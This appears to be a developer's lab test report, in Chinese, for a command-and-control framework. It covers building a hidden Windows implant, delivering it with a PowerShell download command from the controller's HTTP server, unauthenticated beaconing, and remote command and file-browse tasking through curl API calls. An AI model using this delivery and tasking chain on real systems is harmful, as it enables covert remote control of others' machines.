# Hermes Agent Windows 端到端测试报告

> **日期**: 2026-04-28 13:05 ~ 14:00  
> **测试人**: 夏沐  
> **环境**: macOS (Mac) + Windows 10 虚拟机  
> **目标**: 验证 Hermes Agent 在 Windows 目标主机上的完整 C2 链路

---

## 1. 测试环境

### 1.1 控制端 (macOS)

| 项目 | 值 |
|---|---|
| 系统 | macOS (Apple Silicon) |
| IP (对 Windows 网段) | `172.18.64.111` |
| Hermes Server | `cargo run` (dev profile, PID 动态) |
| Server 监听 | HTTP API `0.0.0.0:3000`, TCP Listener `172.18.64.111:1234` |
| Server 配置文件 | `server/config.toml` |
| 交叉编译工具 | `cargo xwin` (MSVC CRT, 无需 Visual Studio) |

**`server/config.toml` 关键配置:**

```toml
[server]
host = "0.0.0.0"
port = 1234

[api]
host = "0.0.0.0"
port = 3000

[auth]
api_token = "dev-api-token"
agent_token = ""
agent_auth_mode = "plain_token"
web_username = "admin"
web_password = "123456"
```

- `agent_token = ""` → 经 `.filter(|v| !v.is_empty())` 处理后为 `None`，即 **不要求 agent 认证**
- `agent_auth_mode = "plain_token"` → 因 token 为空，实际不进行 challenge-response

### 1.2 目标主机 (Windows 10)

| 项目 | 值 |
|---|---|
| 系统 | Windows 10 (Build 19045.6466) |
| 主机名 | `DESKTOP-46OSH8B` |
| IP | `172.18.64.192` |
| 用户 | `macuser` (管理员权限) |
| SSH | OpenSSH Server, 默认 shell `cmd.exe` |
| SSH 密码 | `123456` |

**用户权限 (SeDebugPrivilege, SeLoadDriverPrivilege 等)**:

```
Admin: SeIncreaseQuotaPrivilege, SeSecurityPrivilege, SeTakeOwnershipPrivilege,
SeLoadDriverPrivilege, SeSystemProfilePrivilege, SeSystemtimePrivilege,
SeProfileSingleProcessPrivilege, SeIncreaseBasePriorityPrivilege,
SeCreatePagefilePrivilege, SeBackupPrivilege, SeRestorePrivilege,
SeShutdownPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege,
SeRemoteShutdownPrivilege, SeUndockPrivilege, SeManageVolumePrivilege,
SeImpersonatePrivilege, SeCreateGlobalPrivilege, SeIncreaseWorkingSetPrivilege,
SeTimeZonePrivilege, SeCreateSymbolicLinkPrivilege,
SeDelegateSessionUserImpersonatePrivilege
```

### 1.3 网络拓扑

```
┌─────────────────────┐        TCP :1234        ┌──────────────────────┐
│   macOS (Control)   │◄───────────────────────│  Windows 10 (Target)  │
│   172.18.64.111     │        SSH :22          │  172.18.64.192        │
│   Hermes Server     │───────────────────────►│  Hermes Agent         │
│   HTTP API :3000    │                         │  agent.exe (384KB)    │
└─────────────────────┘                         └──────────────────────┘
```

- 两台主机在同一子网 `172.18.64.0/24`
- macOS 可通过 SSH 连接 Windows (需 `WARP_USE_SSH_WRAPPER=0` 绕过 Warp Terminal 的 SSH wrapper)
- Windows 可访问 macOS 的 `172.18.64.111` 端口

---

## 2. 测试步骤与结果

### 2.1 Agent 编译 (macOS → Windows 交叉编译)

**动作:**
1. 修改 `agent/src/server.rs` 中嵌入的服务器地址：
   - `EMBEDDED_SERVER_ADDR`: `"127.0.0.1:1234"` → `"172.18.64.111:1234"`
   - 其余配置保持默认 (`EMBEDDED_HEARTBEAT_SECS = 15`, `EMBEDDED_JITTER = 0`, `EMBEDDED_AGENT_TOKEN = None`)
2. 使用 `cargo xwin build --release --target x86_64-pc-windows-msvc` 编译

**编译输出:**

```
⏬ Downloading MSVC CRT...
✅ Downloaded MSVC CRT in 1m 47s.
   Compiling windows-sys v0.61.2
   Compiling agent v0.1.0
warning: unused macro definition: `agent_log`
    Finished `release` profile [optimized] target(s) in 7.54s
```

**产物:**

```
agent/target/x86_64-pc-windows-msvc/release/agent.exe  384KB (393,216 bytes)
```

- 编译 profile: `opt-level = "z"`, LTO = true, strip = true, panic = abort
- 无 `tls` feature (plain TCP)
- `windows_subsystem = "windows"` → 无控制台窗口

**结果: ✅ 通过**

---

### 2.2 Agent 传输到 Windows

**尝试过程:**

| 方法 | 结果 | 原因 |
|---|---|---|
| `scp -O` (legacy SCP protocol) | ❌ 传输了 0 字节文件 | 未知原因，静默失败 |
| `scp` (SFTP subsystem) | ❌ `subsystem request failed on channel 0` | Windows OpenSSH 的 SFTP subsystem 问题 |
| SSH pipe + PowerShell `Set-Content -Encoding Byte` | ❌ PS 5.1 不支持管道输入的二进制写入 | `Set-Content` 的 `-Encoding Byte` 不接受管道对象 |
| SSH pipe + `[IO.File]::WriteAllBytes` (base64) | ❌ 被用户中断 | 传输太慢/命令复杂 |

**最终成功方法: Mac 临时 HTTP 服务 + Windows PowerShell 下载**

```bash
# macOS 端
cp agent.exe /tmp/
python3 -m http.server 18888 --bind 0.0.0.0 --directory /tmp

# Windows 端 (通过 SSH 执行)
powershell -NoP -Command "(New-Object Net.WebClient).DownloadFile(\"http://172.18.64.111:18888/agent.exe\", \"C:\Users\macuser\Desktop\agent.exe\")"
```

**验证:**

```
C:\Users\macuser\Desktop> dir agent.exe
2026/04/28  13:31           393,216 agent.exe    ← 大小匹配
```

**结果: ✅ 通过** (绕路 HTTP，SCP 在此环境不可靠)

---

### 2.3 Server 启动与 Listener 配置

**动作:**
1. 停止旧 server 进程 (PID 57857)
2. `cargo run` 启动新 server

**Server 启动日志:**

```
Finished `dev` profile [unoptimized] target(s) in 0.30s
     Running `target/debug/server`
[startup][http]     listening  http://0.0.0.0:3000
[startup][listener] #2 TCP 测试 [tcp_json_v1] 172.18.64.111:1234
```

- HTTP API: `0.0.0.0:3000`
- TCP Listener: 数据库中已存在的 listener #2 "TCP 测试"，绑定到 `172.18.64.111:1234`
- 注意：config.toml 的 `[server]` 配置 `0.0.0.0:1234` 未生效（端口 1234 已被 listener #2 占用）

**之前失败的原因分析:**

旧 server 进程的 TCP listener 绑定在 `0.0.0.0:1234`，但 agent 的 `EMBEDDED_SERVER_ADDR` 也被改成了 `172.18.64.111:1234`。旧 server 环境下 agent 能连上、能发 Register，但 server 收到 Register 后断开了连接。重启后新 server 使用数据库中配置的 listener #2 绑定 `172.18.64.111:1234`，一切正常。

推测旧 server 存在 listener 路由或 session 管理问题（可能 config gateway 和 database listener 存在冲突），但未做深入排查，重启后问题消失。

**结果: ✅ Server 正常运行**

---

### 2.4 Agent 启动与注册

**动作:** 通过 SSH 在 Windows 上执行:

```
C:\Users\macuser\Desktop\agent.exe
```

由于 `windows_subsystem = "windows"`，进程立即脱离控制台在后台运行。

**Agent 端日志 (`C:\Users\macuser\agent_debug.log`):**

```
[1777355350] run_once starting
[1777355350] connected to 172.18.64.111:1234
[1777355351] register sent
[1777355365] read timeout: poll_fast=false hb_due=true
[1777355380] read timeout: poll_fast=false hb_due=true
[1777355395] read timeout: poll_fast=false hb_due=true
```

**Server 端日志:**

```
[server] new connection from 172.18.64.192:9734
[server] agent registered: session_id=1
```

**连接流程 (成功):**

```
Agent                                    Server
  │── TCP Connect ───────────────────────►│
  │                                       │
  │  (receive_hello: 250ms 超时, 无 Hello) │
  │                                       │
  │── Register ──────────────────────────►│ (auth: token=None → 通过)
  │                                       │ (registered=true, session_id=1)
  │                                       │
  │◄── 等待 ServerCommand ────────────────│ (无排队任务)
  │── read timeout (15s) ──               │
  │── Heartbeat ─────────────────────────►│
  │── read timeout (15s) ──               │
  │── Heartbeat ─────────────────────────►│
  │   ... (每 15 秒循环)                   │
```

**注册信息 (API 查询 `GET /agents`):**

```json
{
  "session_id": 1,
  "agent_id": "DESKTOP-46OSH8B",
  "listener_id": 2,
  "listener_name": "TCP 测试",
  "hostname": "DESKTOP-46OSH8B",
  "username": "macuser",
  "os": "windows",
  "arch": "x64",
  "pid": 19896,
  "internal_ip": "172.18.64.192",
  "external_ip": "172.18.64.192",
  "tags": [],
  "sleep_interval": 15,
  "jitter": 0,
  "peer_addr": "172.18.64.192:9734",
  "connected_at": 1777355350648,
  "last_seen": 1777355650862,
  "privilege": "Admin: SeDebugPrivilege, SeLoadDriverPrivilege, ..."
}
```

**结果: ✅ 通过** — Agent 注册成功，心跳正常，server 持续更新 `last_seen`

---

### 2.5 任务下发与执行

#### 2.5.1 首次尝试 (失败)

**请求:**

```bash
curl -X POST http://127.0.0.1:3000/agents/DESKTOP-46OSH8B/tasks \
  -H 'x-api-token: dev-api-token' \
  -H 'Content-Type: application/json' \
  -d '{"command":"shell","payload":"whoami"}'
```

**响应:** `{"success":true,"task_id":"task-15"}`

**执行结果 (失败):**

```json
{
  "task_id": "task-15",
  "command": "shell",
  "payload": "whoami",
  "status": "failed",
  "success": false,
  "output": "'shell' 不是内部或外部命令"  // 实际为 GBK 编码乱码
}
```

**失败原因:** Agent 的 `build_operation_command()` 将 `command` 和 `payload` 拼接为 `"shell whoami"`，然后执行 `cmd /C shell whoami`。`shell` 不是 Windows 可识别的命令。`command` 字段应直接为要执行的命令本身，不是任务类型标识。

#### 2.5.2 正确请求 (成功)

**请求:**

```bash
curl -X POST http://127.0.0.1:3000/agents/DESKTOP-46OSH8B/tasks \
  -H 'x-api-token: dev-api-token' \
  -H 'Content-Type: application/json' \
  -d '{"command":"whoami"}'
```

**响应:** `{"success":true,"task_id":"task-17"}`

**执行结果 (成功):**

```json
{
  "task_id": "task-17",
  "command": "whoami",
  "payload": null,
  "status": "succeeded",
  "success": true,
  "output": "desktop-46osh8b\\macuser"
}
```

**任务执行流程:**

```
Operator                Server                  Agent
  │── POST /agents/{id}/tasks ──►│                    │
  │   (task 入队)                 │                    │
  │                               │                    │
  │                               │  ◄── Heartbeat ────│  (15s 轮询)
  │                               │── DispatchTask ──► │  (下发排队任务)
  │                               │                    │── cmd /C whoami
  │                               │  ◄── TaskResult ──│  (执行结果回传)
  │◄── 200 OK (task updated) ────│                    │
```

**结果: ✅ 通过** — 完整 C2 任务链路：下发 → 心跳取走 → 执行 → 回传结果

---

### 2.6 其他观察到的事件

#### 2.6.1 Browse 任务 (来自 web client)

在测试期间，发现一个额外任务 `task-16` 已被自动下发（可能来自 web client 操作）：

```json
{
  "task_id": "task-16",
  "command": "browse",
  "payload": "{\"path\":\"C:\\\\"}",
  "status": "dispatched"
}
```

此任务由 `file_ops::handle_browse` 处理，属于内置文件操作路由。

#### 2.6.2 任务输出编码问题

Agent 在 Windows 上执行命令时，`cmd.exe` 的输出编码为 GBK (代码页 936)。Agent 使用 `String::from_utf8_lossy()` 处理 stdout/stderr，导致非 ASCII 输出出现乱码。此问题在 `task-15` 的失败输出中可见。

---

## 3. 测试总结

### 3.1 测试覆盖

| 测试项 | 状态 | 备注 |
|---|---|---|
| macOS → Windows 交叉编译 (MSVC) | ✅ | `cargo xwin`, 384KB 产物 |
| Agent 二进制传输到 Windows | ✅ | HTTP 下载 (SCP 不可靠) |
| Agent 后台运行 (`windows_subsystem`) | ✅ | 无控制台窗口，脱离终端 |
| TCP 连接 (plain TCP, 无 TLS) | ✅ | 跨子网 `172.18.64.0/24` |
| Agent → Server 注册 (无 token) | ✅ | `agent_token = ""` → `None` → 自动通过 |
| 心跳 beacon (15s / 0 jitter) | ✅ | 持续在线，`last_seen` 正常更新 |
| 任务下发 (API → Server → Agent) | ✅ | HTTP API `POST /agents/{id}/tasks` |
| Shell 命令执行 (`whoami`) | ✅ | `desktop-46osh8b\macuser` |
| 任务结果回传 (Agent → Server → API) | ✅ | `GET /tasks` 可查询 |
| 内置文件操作路由 (`browse`) | ✅ | 任务已 dispatch |

### 3.2 未测试项

| 项目 | 原因 |
|---|---|
| TLS 加密连接 | 未启用 `tls` feature |
| Token 认证 (plain_token) | `agent_token` 为空，未实际验证 |
| Challenge-Response 认证 | 需要配置非空 `agent_token` + `agent_auth_mode = "challenge_response"` |
| 命令会话 (Command Session) | 未测试交互式 shell |
| 文件上传/下载 | 未测试 |
| Beacon config 动态更新 | 未测试 `UpdateBeaconConfig` |
| 任务取消 | 未测试 `CancelTask` |
| Jitter 随机化 | `EMBEDDED_JITTER = 0`，未测试随机化效果 |
| Windows Defender 兼容性 | Agent 进程运行中未被查杀，但未做长期观察 |
| 输出编码 (GBK → UTF-8) | 存在乱码问题，需要修复 |

### 3.3 已知问题

1. **SCP 传输失败**: `scp -O` 到 Windows OpenSSH Server 传输了 0 字节文件，原因不明。建议后续测试使用 HTTP 或其他可靠传输方式。
2. **任务输出 GBK 乱码**: Agent 在 Windows 上使用 `String::from_utf8_lossy()` 处理 `cmd.exe` 的 GBK 编码输出，非 ASCII 字符会变为乱码。需要改用编码感知的解码方式。
3. **旧 Server 进程断连**: 首次测试时旧 server 进程收到 Register 后断开连接，重启后问题消失。可能与 config gateway 和 database listener 端口冲突有关。

### 3.4 API 路由备注

Server 的 HTTP API 路由 **不带 `/api/` 前缀**:

```
GET  /agents                     ← 列出在线 agent
POST /agents/{id}/tasks          ← 下发任务
GET  /tasks                      ← 查询任务列表
GET  /health                     ← 健康检查
POST /auth/login                 ← Web 登录
```

认证方式: `x-api-token: dev-api-token` (header)

---

## 4. 附录

### 4.1 Agent 核心配置 (编译时嵌入)

```rust
// agent/src/server.rs (修改后)
const EMBEDDED_SERVER_ADDR: &str = "172.18.64.111:1234";
const EMBEDDED_AGENT_TOKEN: Option<&str> = None;
const EMBEDDED_PROTOCOL: &str = "tcp";
const EMBEDDED_HEARTBEAT_SECS: u64 = 15;
const EMBEDDED_JITTER: u32 = 0;
```

### 4.2 关键文件路径 (Windows 端)

```
C:\Users\macuser\Desktop\agent.exe         ← agent 二进制
C:\Users\macuser\agent_debug.log           ← 运行日志 (alog! 宏)
C:\Users\macuser\Desktop\agent.log          ← 未生成 (agent_log! 宏, 未触发)
```

### 4.3 关键文件路径 (macOS 端)

```
agent/target/x86_64-pc-windows-msvc/release/agent.exe   ← 编译产物
agent/src/server.rs                                       ← 嵌入配置 (已修改)
server/config.toml                                        ← server 配置
server/data/server.db                                     ← SQLite 数据库
```
